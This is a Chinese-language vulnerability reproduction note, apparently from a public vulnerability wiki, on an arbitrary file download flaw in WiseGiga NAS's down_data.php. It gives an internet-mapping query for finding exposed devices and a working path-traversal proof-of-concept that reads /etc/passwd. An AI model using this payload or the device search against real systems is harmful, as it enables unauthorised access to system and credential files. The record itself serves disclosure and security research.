---
title: "WiseGiga NAS down_data.php 任意文件下载漏洞"
date: 2026-10-16 09:09:41
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "WiseGiga-NAS"
tags:
  - "WiseGiga-NAS"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

WiseGiga 是一家销售网络连接存储（NAS ）产品的韩国公司。

WISEGIGA NAS down_data.php 存在任意文件下载漏洞，由于 /down_data.php 页面 filename 参数过滤不严，导致可以读取系统敏感文件。

## 漏洞影响

```
WiseGiga NAS
```

## 网络测绘

```
app="WISEGIGA-NAS"
```

## 漏洞复现

主页面

![image-20220628113649787](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202206281136917.png)

验证POC

```
/down_data.php?filename=../../../../../../../../../../../../../../etc/passwd
```

![image-20220628113749412](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202206281137504.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/WiseGiga-NAS-down_data.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
